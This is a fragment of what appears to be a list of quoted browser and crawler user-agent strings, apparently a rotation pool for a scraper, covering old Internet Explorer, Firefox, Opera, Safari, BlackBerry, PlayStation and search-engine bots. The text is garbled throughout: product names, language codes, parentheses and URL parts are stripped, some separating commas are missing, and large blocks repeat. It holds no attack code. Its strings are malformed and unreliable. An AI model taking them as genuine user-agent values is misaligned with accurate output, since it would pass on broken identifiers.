	"/5.0 Windows; U; Windows NT 5.1; -US /532.1 KHTML,  Gecko /4.0.219.6 Safari/532.1",
	"/4.0 ; MSIE 8.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2",
	"/4.0 ; MSIE 8.0; Windows NT 6.0; /4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729",
	"/4.0 ; MSIE 8.0; Windows NT 5.2; Win64; x64; /4.0",
	"/4.0 ; MSIE 8.0; Windows NT 5.1; /4.0; SV1; .NET CLR 2.0.50727; InfoPath.2",
	"/5.0 Windows; U; MSIE 7.0; Windows NT 6.0; -US",
	"/4.0 ; MSIE 6.1; Windows XP",
	"/9.80 Windows NT 5.2; U;  Presto/2.5.22 /10.51",
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.1.3 Gecko/20090913 Firefox/3.5.3",
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 2.0.50727",
	"/5.0 Windows; U; Windows NT 5.2; -; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 3.5.30729",
	"/5.0 Windows; U; Windows NT 6.1; -US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1 .NET CLR 3.0.04506.648",
	"/4.0 ; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E",
	"/5.0 Windows; U; Windows NT 5.1; -US /532.1 KHTML,  Gecko /4.0.219.6 Safari/532.1",
	"/4.0 ; MSIE 8.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2",
	"/9.60 J2ME/MIDP;  Mini/4.2.14912/812; U;  Presto/2.4.15",
	"/5.0 Macintosh; U; PPC Mac OS X; -US /125.4 KHTML,  Gecko, Safari OmniWeb/v563.57",
	"/5.0 SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; /MIDP-2.0 /CLDC-1.1  /413 KHTML,  Gecko Safari/413",
	"/4.0 ; MSIE 8.0; Windows NT 6.0; /4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729",
	"/4.0 ; MSIE 8.0; Windows NT 5.2; Win64; x64; /4.0",
	"/5.0 Windows; U; WinNT4.0; -US; rv:1.8.0.5 Gecko/20060706 K-/1.0",
	"Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/",
	"/4.76 [] PalmOS; U; WebPro/; Palm-Arz1",
	"/5.0 Macintosh; U; PPC Mac OS X; - /418 KHTML,  Gecko /1.2.2 Safari/125",
	"/5.0 X11; U; Linux i686 x86_64; -US; rv:1.8.1.6 Gecko/2007072300 Iceweasel/2.0.0.6 -2.0.0.6-0etch1+lenny1",
	"/5.0 SymbianOS/9.1; U; -us /413 KHTML,  Gecko Safari/413",
	"/4.0 ; MSIE 6.1; Windows NT 5.1; /4.0; SV1; .NET CLR 3.5.30729; InfoPath.2",
	"/5.0 Windows; U; MSIE 7.0; Windows NT 6.0; -US",
	"Links 2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25",
	"/4.0 ; MSIE 6.0; Windows NT 5.0; WOW64; /4.0; SLCC1",
	"/1.22 ; Konqueror/4.3; Linux KHTML/4.3.5  Gecko",
	"/4.0 ; MSIE 6.0; Windows CE;  6.5",
	"/9.80 Macintosh; U; - Presto/2.8.131 /11.10",
	"/5.0 X11; U; Linux i686; -US; rv:1.9.1.9 Gecko/20100318 /2.0.4-69.1mib2010.0 SeaMonkey/2.0.4",
	"/4.0 ; MSIE 6.1; Windows XP Gecko/20060706 /7.0",
	"/5.0 ; U; CPU OS 3_2  Mac OS X; -us /531.21.10 KHTML,  Gecko /4.0.4 /7B334b Safari/531.21.10",
	"/5.0 Macintosh; I; Intel Mac OS X 10_6_7; -",
	"/5.0 ; MSIE 9.0; Windows NT 6.1; /5.0",
	"/1.22 ; MSIE 6.0; Windows NT 6.1; /4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729;  Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3",
	"/5.0 ; /3.0; +://yandex.com/bots",
	"/4.0 Macintosh; U; Intel Mac OS X 10_6_7; -US /534.16 KHTML,  Gecko /10.0.648.205 Safari/534.16",
	"/1.22 X11; U; Linux x86_64; -US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1",
	"/5.0 ; MSIE 2.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2",
	"/9.80 Windows NT 5.2; U;  Presto/2.5.22 /10.51",
	"/5.0 ; MSIE 2.0; Windows CE;  7.0",
	"/4.0 Macintosh; U; PPC Mac OS X; -US",
	"/5.0 Windows; U; Windows NT 6.0; ; rv:1.9.1.7 Gecko/20091221 Firefox/3.5.7",
	"BlackBerry8300/4.2.2 /MIDP-2.0 /CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0",
	"/1.22 ; MSIE 2.0; Windows 3.1",
	"/4.0 ; MSIE 6.0; Windows NT 5.1;  Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322",
	"/3.0 Windows NT 6.1; -; rv:1.9.1.3. Win32; x86 Firefox/3.5.3 .NET CLR 2.0.50727",
	"/7.0 ; MSIE 2.0; Windows 3.1",
	"/9.80 Windows NT 5.1; U; -US Presto/2.8.131 /11.10",
	"/4.0 ; MSIE 6.0;   Browser 1.1; rev1.5; Windows NT 5.1;",
	"/5.0 Windows; U; Windows CE 4.21; rv:1.8b4 Gecko/20050720 Minimo/0.007",
	"BlackBerry9000/5.0.0.93 /MIDP-2.0 /CLDC-1.1 VendorID/179",
	"/4.0 ; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30",
	"/4.0 ; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322",
	"/2.1 ://.com/.html",
	"/9.20 Windows NT 6.0; U; ",
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.1 Gecko/20061205 Iceweasel/2.0.0.1 -2.0.0.1+-2",
	"/4.0 ; MSIE 7.0; Windows NT 5.1; /4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322",
	"/10.00 X11; Linux i686; U;  Presto/2.2.0",
	"/5.0 Windows; U; Windows NT 6.0; -IL /528.16 KHTML,  Gecko /4.0 Safari/528.16",
	"/5.0 ; Yahoo! /3.0; ://.yahoo.com//us/ysearch/",
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.2.13 Gecko/20101209 Firefox/3.6.13",
	"/4.0 ; MSIE 9.0; Windows NT 5.1; /5.0",
	"/5.0 ; MSIE 8.0; Windows NT 5.1; /4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727",
	"/4.0 ; MSIE 7.0b; Windows NT 6.0",
	"/4.0 ; MSIE 6.0b; Windows 98",
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.2.3 Gecko/20100401 Firefox/4.0 .NET CLR 3.5.30729",
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.2.8 Gecko/20100804 Gentoo Firefox/3.6.8",
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.2.7 Gecko/20100809 /3.6.7-1.fc14 Firefox/3.6.7",
	"/5.0 ; /2.1; +://.com/.html",
	"/5.0 ; Yahoo! ; ://.yahoo.com//us/ysearch/",
	"YahooSeeker/1.2 ;  4.0; MSIE 5.5; yahooseeker  yahoo-inc  com ; ://.yahoo.com//us///",
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.1.3 Gecko/20090913 Firefox/3.5.3",
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 3.5.30729",
	"/5.0 Windows; U; Windows NT 5.2; -US; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 3.5.30729",
	"/5.0 Windows; U; Windows NT 6.1; -US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1",
	"/5.0 Windows; U; Windows NT 5.1; -US /532.1 KHTML,  Gecko /4.0.219.6 Safari/532.1",
	"/4.0 ; MSIE 8.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2",
	"/4.0 ; MSIE 8.0; Windows NT 6.0; /4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729",
	"/4.0 ; MSIE 8.0; Windows NT 5.2; Win64; x64; /4.0",
	"/4.0 ; MSIE 8.0; Windows NT 5.1; /4.0; SV1; .NET CLR 2.0.50727; InfoPath.2",
	"/5.0 Windows; U; MSIE 7.0; Windows NT 6.0; -US",
	"/4.0 ; MSIE 6.1; Windows XP",
	"/9.80 Windows NT 5.2; U;  Presto/2.5.22 /10.51",
	"-; +://.com/; : webetrex",
	"/5.0 ; MSIE 9.0; AOL 9.7;  4343.19; Windows NT 6.1; WOW64; /5.0; FunWebProducts",
	"/4.0 ; MSIE 8.0; AOL 9.7;  4343.27; Windows NT 5.1; /4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729",
	"/4.0 ; MSIE 8.0; AOL 9.7;  4343.21; Windows NT 5.1; /4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E",
	"/4.0 ; MSIE 8.0; AOL 9.7;  4343.19; Windows NT 5.1; /4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729",
	"/4.0 ; MSIE 8.0; AOL 9.7;  4343.19; Windows NT 5.1; /4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E",
	"/4.0 ; MSIE 7.0; AOL 9.7;  4343.19; Windows NT 5.1; /4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E",
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.1.3 Gecko/20090913 Firefox/3.5.3",
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 2.0.50727",
	"/5.0 Windows; U; Windows NT 5.2; -; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 3.5.30729",
	"/5.0 Windows; U; Windows NT 6.1; -US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1 .NET CLR 3.0.04506.648",
	"/4.0 ; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E",
	"/5.0 Windows; U; Windows NT 5.1; -US /532.1 KHTML,  Gecko /4.0.219.6 Safari/532.1",
	"/4.0 ; MSIE 8.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2",
	"/9.60 J2ME/MIDP;  Mini/4.2.14912/812; U;  Presto/2.4.15",
	"/5.0 Macintosh; U; PPC Mac OS X; -US /125.4 KHTML,  Gecko, Safari OmniWeb/v563.57",
	"/5.0 SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; /MIDP-2.0 /CLDC-1.1  /413 KHTML,  Gecko Safari/413",
	"/4.0 ; MSIE 8.0; Windows NT 6.0; /4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729",
	"/4.0 ; MSIE 8.0; Windows NT 5.2; Win64; x64; /4.0",
	"/5.0 Windows; U; WinNT4.0; -US; rv:1.8.0.5 Gecko/20060706 K-/1.0",
	"Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/",
	"/4.76 [] PalmOS; U; WebPro/; Palm-Arz1",
	"/5.0 Macintosh; U; PPC Mac OS X; - /418 KHTML,  Gecko /1.2.2 Safari/125",
	"/5.0 X11; U; Linux i686 x86_64; -US; rv:1.8.1.6 Gecko/2007072300 Iceweasel/2.0.0.6 -2.0.0.6-0etch1+lenny1",
	"/5.0 SymbianOS/9.1; U; -us /413 KHTML,  Gecko Safari/413",
	"/4.0 ; MSIE 6.1; Windows NT 5.1; /4.0; SV1; .NET CLR 3.5.30729; InfoPath.2",
	"/5.0 Windows; U; MSIE 7.0; Windows NT 6.0; -US",
	"Links 2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25",
	"/4.0 ; MSIE 6.0; Windows NT 5.0; WOW64; /4.0; SLCC1",
	"/1.22 ; Konqueror/4.3; Linux KHTML/4.3.5  Gecko",
	"/4.0 ; MSIE 6.0; Windows CE;  6.5",
	"/9.80 Macintosh; U; - Presto/2.8.131 /11.10",
	"/5.0 X11; U; Linux i686; -US; rv:1.9.1.9 Gecko/20100318 /2.0.4-69.1mib2010.0 SeaMonkey/2.0.4",
	"/4.0 ; MSIE 6.1; Windows XP Gecko/20060706 /7.0",
	"/5.0 ; U; CPU OS 3_2  Mac OS X; -us /531.21.10 KHTML,  Gecko /4.0.4 /7B334b Safari/531.21.10",
	"/5.0 Macintosh; I; Intel Mac OS X 10_6_7; -",
	"/5.0 ; MSIE 9.0; Windows NT 6.1; /5.0",
	"/1.22 ; MSIE 6.0; Windows NT 6.1; /4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729;  Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3",
	"/5.0 ; /3.0; +://yandex.com/bots",
	"/4.0 Macintosh; U; Intel Mac OS X 10_6_7; -US /534.16 KHTML,  Gecko /10.0.648.205 Safari/534.16",
	"/1.22 X11; U; Linux x86_64; -US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1",
	"/5.0 ; MSIE 2.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2",
	"/9.80 Windows NT 5.2; U;  Presto/2.5.22 /10.51",
	"/5.0 ; MSIE 2.0; Windows CE;  7.0",
	"/4.0 Macintosh; U; PPC Mac OS X; -US",
	"/5.0 Windows; U; Windows NT 6.0; ; rv:1.9.1.7 Gecko/20091221 Firefox/3.5.7",
	"BlackBerry8300/4.2.2 /MIDP-2.0 /CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0",
	"/1.22 ; MSIE 2.0; Windows 3.1",
	"/4.0 ; MSIE 6.0; Windows NT 5.1;  Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322",
	"/3.0 Windows NT 6.1; -; rv:1.9.1.3. Win32; x86 Firefox/3.5.3 .NET CLR 2.0.50727",
	"/7.0 ; MSIE 2.0; Windows 3.1",
	"/9.80 Windows NT 5.1; U; -US Presto/2.8.131 /11.10",
	"/4.0 ; MSIE 6.0;   Browser 1.1; rev1.5; Windows NT 5.1;",
	"/5.0 Windows; U; Windows CE 4.21; rv:1.8b4 Gecko/20050720 Minimo/0.007",
	"BlackBerry9000/5.0.0.93 /MIDP-2.0 /CLDC-1.1 VendorID/179",
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.1.3 Gecko/20090913 Firefox/3.5.3",
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 2.0.50727",
	"/5.0 Windows; U; Windows NT 5.2; -; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 3.5.30729",
	"/5.0 Windows; U; Windows NT 6.1; -US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1 .NET CLR 3.0.04506.648",
	"/4.0 ; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E",
	"/5.0 Windows; U; Windows NT 5.1; -US /532.1 KHTML,  Gecko /4.0.219.6 Safari/532.1"
	"/4.0 ; MSIE 8.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2",
	"/9.60 J2ME/MIDP;  Mini/4.2.14912/812; U;  Presto/2.4.15",
	"/5.0 Macintosh; U; PPC Mac OS X; -US /125.4 KHTML,  Gecko, Safari OmniWeb/v563.57",
	"/5.0 SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; /MIDP-2.0 /CLDC-1.1  /413 KHTML,  Gecko Safari/413",
	"/4.0 ; MSIE 8.0; Windows NT 6.0; /4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729",
	"/4.0 ; MSIE 8.0; Windows NT 5.2; Win64; x64; /4.0",
	"/5.0 Windows; U; WinNT4.0; -US; rv:1.8.0.5 Gecko/20060706 K-/1.0",
	"Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/",
	"/4.76 [] PalmOS; U; WebPro/; Palm-Arz1",
	"/5.0 Macintosh; U; PPC Mac OS X; - /418 KHTML,  Gecko /1.2.2 Safari/125",
	"/5.0 X11; U; Linux i686 x86_64; -US; rv:1.8.1.6 Gecko/2007072300 Iceweasel/2.0.0.6 -2.0.0.6-0etch1+lenny1",
	"/5.0 SymbianOS/9.1; U; -us /413 KHTML,  Gecko Safari/413",
	"/4.0 ; MSIE 6.1; Windows NT 5.1; /4.0; SV1; .NET CLR 3.5.30729; InfoPath.2",
	"/5.0 Windows; U; MSIE 7.0; Windows NT 6.0; -US",
	"Links 2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25",
	"/4.0 ; MSIE 6.0; Windows NT 5.0; WOW64; /4.0; SLCC1",
	"/1.22 ; Konqueror/4.3; Linux KHTML/4.3.5  Gecko",
	"/4.0 ; MSIE 6.0; Windows CE;  6.5",
	"/9.80 Macintosh; U; - Presto/2.8.131 /11.10",
	"/5.0 X11; U; Linux i686; -US; rv:1.9.1.9 Gecko/20100318 /2.0.4-69.1mib2010.0 SeaMonkey/2.0.4",
	"/4.0 ; MSIE 6.1; Windows XP Gecko/20060706 /7.0",
	"/5.0 ; U; CPU OS 3_2  Mac OS X; -us /531.21.10 KHTML,  Gecko /4.0.4 /7B334b Safari/531.21.10",
	"/5.0 Macintosh; I; Intel Mac OS X 10_6_7; -",
	"/5.0 ; MSIE 9.0; Windows NT 6.1; /5.0",
	"/1.22 ; MSIE 6.0; Windows NT 6.1; /4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729;  Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3",
	"/5.0 ; /3.0; +://yandex.com/bots",
	"/4.0 Macintosh; U; Intel Mac OS X 10_6_7; -US /534.16 KHTML,  Gecko /10.0.648.205 Safari/534.16",
	"/1.22 X11; U; Linux x86_64; -US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1",
	"/5.0 ; MSIE 2.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2",
	"/9.80 Windows NT 5.2; U;  Presto/2.5.22 /10.51",
	"/5.0 ; MSIE 2.0; Windows CE;  7.0",
	"/4.0 Macintosh; U; PPC Mac OS X; -US",
	"/5.0 Windows; U; Windows NT 6.0; ; rv:1.9.1.7 Gecko/20091221 Firefox/3.5.7",
	"BlackBerry8300/4.2.2 /MIDP-2.0 /CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0",
	"/1.22 ; MSIE 2.0; Windows 3.1",
	"/4.0 ; MSIE 6.0; Windows NT 5.1;  Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322",
	"/3.0 Windows NT 6.1; -; rv:1.9.1.3. Win32; x86 Firefox/3.5.3 .NET CLR 2.0.50727",
	"/7.0 ; MSIE 2.0; Windows 3.1",
	"/9.80 Windows NT 5.1; U; -US Presto/2.8.131 /11.10",
	"/4.0 ; MSIE 6.0;   Browser 1.1; rev1.5; Windows NT 5.1;",
	"/5.0 Windows; U; Windows CE 4.21; rv:1.8b4 Gecko/20050720 Minimo/0.007",
	"BlackBerry9000/5.0.0.93 /MIDP-2.0 /CLDC-1.1 VendorID/179",
	"/5.0 ; 008/0.83; ://www.80legs.com/webcrawler.html Gecko/2008032620",
	"/4.0 ; MSIE 7.0; Windows NT 6.0  www.idealobserver.com",
	"/5.0 ; /1.0; +://www.anyapex.com/.html",
	"/4.0 ; Arachmo",
	"/4.0 ; B-l-i--z-B-O-T",
	"/5.0 ; Baiduspider/2.0; +://.com/search/spider.html",
	"/5.0 ; Baiduspider/2.0; +://.com/search/spider.html",
	"/5.0 ; /2.3; MSIE 6.0 ; +://.com/site_owners.html",
	"/1.0 +://.com/crawler/",
	"/5.0 ; /2.0; +://.com/.htm",
	"Sqworm/2.9.85-BETA beta_release; 20011115-775; i686-pc-linux-",
	"/5.0 ; YandexImages/3.0; +://yandex.com/bots"
	"/5.0 ; Yahoo! ; ://.yahoo.com//us/ysearch/",
	"/5.0 ; /1.0; ://www.yodao.com//webmaster/spider/; ",
	"/5.0 ; /1.0; ://www.yodao.com//webmaster/spider/; ",
	"/4.0  /1.0  Link Checker @; ://.com",
	"/4.0  /1.0  Link Checker .dlc@; ://.com",
	"/4.0  /1.0 -@; ://.com",
	"/5.0 ; U;  0.6;  /420+ KHTML,  Gecko",
	"/5.0 ; MSIE 8.0; Windows NT 6.0; /4.0; Acoo Browser 1.98.744; .NET CLR 3.5.30729",
	"/4.0 ; MSIE 8.0; Windows NT 5.1; /4.0; SV1; Acoo Browser; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729;  Browser",
	"/4.0 ; MSIE 8.0; Windows NT 6.0; /4.0; Acoo Browser; GTB6; /4.0 ; MSIE 6.0; Windows NT 5.1; SV1 ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618",
	"/4.0 ; MSIE 6.0; Windows NT 5.1; SV1; Acoo Browser; .NET CLR 1.1.4322; .NET CLR 2.0.50727",
	"/5.0 Macintosh; U; PPC Mac OS X;  /419 KHTML,  Gecko, Safari/419.3 /1.0.ALPHA",
	"/5.0 Windows; U; Windows NT 5.1; -US /532.2 KHTML,  Gecko ChromePlus/4.0.222.3 /4.0.222.3 Safari/532.2",
	"/5.0 Windows; U; Windows NT 6.1; -US /534.10 KHTML,  Gecko /8.0.552.215 Safari/534.10 ChromePlus/1.5.1.1",
	"Links 2.7; Linux 3.7.9-2-ARCH x86_64; GNU C 4.7.1; ",
	"/5.0 Macintosh; Intel Mac OS X 10_9_3 /537.75.14 KHTML,  Gecko /7.0.3 Safari/7046A194A",
	"/5.0 PLAYSTATION 3; 3.55",
	"/5.0 PLAYSTATION 3; 2.00",
	"/5.0 PLAYSTATION 3; 1.00",
	"/5.0 Windows NT 6.3; WOW64; rv:24.0 Gecko/20100101 /24.4.0",
	"/5.0 ; /1.0; +://www.abilogic.com/.html",
	"SiteBar/3.3.8 Bookmark Server; :///",
	"iTunes/9.0.3 Macintosh; U; Intel Mac OS X 10_6_2; -",
	"iTunes/9.0.3 Macintosh; U; Intel Mac OS X 10_6_2; -",
	"/4.0 ;  3.0; Macintosh",
	"/5.0 Windows; U; Windows NT 5.1; ; rv:1.9.2.3 Gecko/20100401 Firefox/3.6.3 FM  4.6.1",
	"/5.0 Windows; U; Windows NT 5.1; ; rv:1.9.2.3 Gecko/20100401 Firefox/3.6.3 .NET CLR 3.5.30729 Prevx 3.0.5 ",
	"/5.0 X11; U; Linux x86_64; -US; rv:1.8.1.8 Gecko/20071004 Iceweasel/2.0.0.8 -2.0.0.6+2.0.0.8-Oetch1",
	"/5.0 Windows; U; Windows NT 5.2; -US; rv:1.8.0.1 Gecko/20060111 Firefox/1.5.0.1",
	"/4.0 ; MSIE 6.0; Windows NT 5.1; SV1",
	"/4.0 ; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322",
	"/4.0 ; MSIE 6.0; Windows NT 5.1; {1C69E7AA-C14E-200E-5A77-8EAB2D667A07}",
	"/4.0 ; MSIE 6.0; Windows NT 5.1; acc=baadshah; acc=;  DSL 1.1; ",
	"/4.0 ; MSIE 5.5; Windows 98",
	"/4.0 ; MSIE 6.0; Windows NT 5.1;   8.51",
	"/5.0 Windows; U; Windows NT 5.1; -US; rv:1.8.0.1 Gecko/20060111 Firefox/1.5.0.1",
	"/4.0 ; MSIE 6.0; Windows NT 5.1; snprtz|S26320700000083|2600# Pack 1#2#5#154321|",
	"/4.0 ; MSIE 6.0; Windows NT 5.1; SV1;  Toolbar; ; .NET CLR 1.1.4322",
	"/5.0 Macintosh; U; PPC Mac OS X; - /417.9 KHTML,  Gecko Safari/417.8",
	"/5.0 X11; U; Linux i686; -US; rv:1.7.12 Gecko/20051010 Firefox/1.0.7   1.0.7",
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.1.3 Gecko/20090913 Firefox/3.5.3",
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 3.5.30729",
	"/5.0 Windows; U; Windows NT 5.2; -US; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 3.5.30729",
	"/5.0 Windows; U; Windows NT 6.1; -US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1",
	"/5.0 Windows; U; Windows NT 5.1; -US /532.1 KHTML,  Gecko /4.0.219.6 Safari/532.1",
	"/4.0 ; MSIE 8.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2",
	"/4.0 ; MSIE 8.0; Windows NT 6.0; /4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729",
	"/4.0 ; MSIE 8.0; Windows NT 5.2; Win64; x64; /4.0",
	"/4.0 ; MSIE 8.0; Windows NT 5.1; /4.0; SV1; .NET CLR 2.0.50727; InfoPath.2",
	"/5.0 Windows; U; MSIE 7.0; Windows NT 6.0; -US",
	"/4.0 ; MSIE 6.1; Windows XP",
	"/9.80 Windows NT 5.2; U;  Presto/2.5.22 /10.51",
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.1.3 Gecko/20090913 Firefox/3.5.3",
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 2.0.50727",
	"/5.0 Windows; U; Windows NT 5.2; -; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 3.5.30729",
	"/5.0 Windows; U; Windows NT 6.1; -US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1 .NET CLR 3.0.04506.648",
	"/4.0 ; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E",
	"/5.0 Windows; U; Windows NT 5.1; -US /532.1 KHTML,  Gecko /4.0.219.6 Safari/532.1",
	"/4.0 ; MSIE 8.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2",
	"/9.60 J2ME/MIDP;  Mini/4.2.14912/812; U;  Presto/2.4.15",
	"/5.0 Macintosh; U; PPC Mac OS X; -US /125.4 KHTML,  Gecko, Safari OmniWeb/v563.57",
	"/5.0 SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; /MIDP-2.0 /CLDC-1.1  /413 KHTML,  Gecko Safari/413",
	"/4.0 ; MSIE 8.0; Windows NT 6.0; /4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729",
	"/4.0 ; MSIE 8.0; Windows NT 5.2; Win64; x64; /4.0",
	"/5.0 Windows; U; WinNT4.0; -US; rv:1.8.0.5 Gecko/20060706 K-/1.0",
	"Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/",
	"/4.76 [] PalmOS; U; WebPro/; Palm-Arz1",
	"/5.0 Macintosh; U; PPC Mac OS X; - /418 KHTML,  Gecko /1.2.2 Safari/125",
	"/5.0 X11; U; Linux i686 x86_64; -US; rv:1.8.1.6 Gecko/2007072300 Iceweasel/2.0.0.6 -2.0.0.6-0etch1+lenny1",
	"/5.0 SymbianOS/9.1; U; -us /413 KHTML,  Gecko Safari/413",
	"/4.0 ; MSIE 6.1; Windows NT 5.1; /4.0; SV1; .NET CLR 3.5.30729; InfoPath.2",
	"/5.0 Windows; U; MSIE 7.0; Windows NT 6.0; -US",
	"Links 2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25",
	"/4.0 ; MSIE 6.0; Windows NT 5.0; WOW64; /4.0; SLCC1",
	"/1.22 ; Konqueror/4.3; Linux KHTML/4.3.5  Gecko",
	"/4.0 ; MSIE 6.0; Windows CE;  6.5",
	"/9.80 Macintosh; U; - Presto/2.8.131 /11.10",
	"/5.0 X11; U; Linux i686; -US; rv:1.9.1.9 Gecko/20100318 /2.0.4-69.1mib2010.0 SeaMonkey/2.0.4",
	"/4.0 ; MSIE 6.1; Windows XP Gecko/20060706 /7.0",
